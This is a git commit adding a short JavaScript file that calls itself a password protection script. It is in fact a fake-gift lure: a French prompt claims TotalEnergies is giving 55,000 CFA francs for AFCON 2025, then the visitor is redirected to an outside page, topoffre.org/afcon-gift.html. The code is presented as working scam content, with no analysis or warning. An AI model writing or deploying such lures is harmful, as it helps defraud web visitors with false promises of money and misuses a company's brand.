dc483fc3b2bd7224a86ad6967700f366f13b79b8
sweet16guyz-hue <sweet16guyz@gmail.com>
2026-01-08 08:20:45 +0100

    Create afcon-active.js

---
+++ afcon-active.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'RETIRER 55 000 francs CFA'
+password = prompt(
+  'AFCON25: Félicitations ! Vous êtes éligible pour recevoir un cadeau de 55 000 francs CFA pour la CAN 2025 de TotalEnergies. Appuyez sur OK pour retirer votre argent dès maintenant..',
+  'RETIRER 55 000 francs CFA'
+);
+if (password != 'RETIRER 55 000 francs CFA') {
+  location.href = 'https://topoffre.org/afcon-gift.html';
+}
